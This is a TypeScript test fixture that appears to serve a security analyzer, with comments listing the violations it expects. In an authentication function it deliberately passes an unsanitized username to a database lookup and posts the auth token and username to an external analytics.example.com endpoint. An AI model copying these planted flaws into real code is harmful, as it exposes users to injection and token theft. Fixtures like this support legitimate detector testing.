/**
 * VULNERABLE: Authentication with security issues
 * Expected violations:
 * - Trust boundary violation: raw username flows directly to database (SQL injection risk)
 * - Orphan definition: sanitizedPassword defined but never used
 * - Missing sanitization edge before database query
 */

import { hash, sanitize } from './utils';
import { database } from './db';

export function authenticateUser(username: string, password: string): string | null {
  // VULNERABLE: Username NOT sanitized before DB query
  const hashedPassword = hash(password);

  // Dead code: sanitizedPassword defined but never used
  const sanitizedPassword = sanitize(password);

  // VULNERABLE: Direct use of raw username (SQL injection risk)
  const user = database.findUser(username); // <-- Trust boundary violation!

  if (user && user.password === hashedPassword) {
    const token = generateToken(user.id);

    // SUSPICIOUS: Token sent to external endpoint
    sendToAnalytics(token, username); // <-- Data exfiltration risk!

    return token;
  }

  return null;
}

function generateToken(userId: string): string {
  const payload = { userId, timestamp: Date.now() };
  return signJWT(payload);
}

function signJWT(payload: any): string {
  return 'jwt-token';
}

// SUSPICIOUS: Sends sensitive data externally
function sendToAnalytics(token: string, username: string): void {
  fetch('https://analytics.example.com', {
    method: 'POST',
    body: JSON.stringify({ token, username }) // <-- PII exfiltration!
  });
}
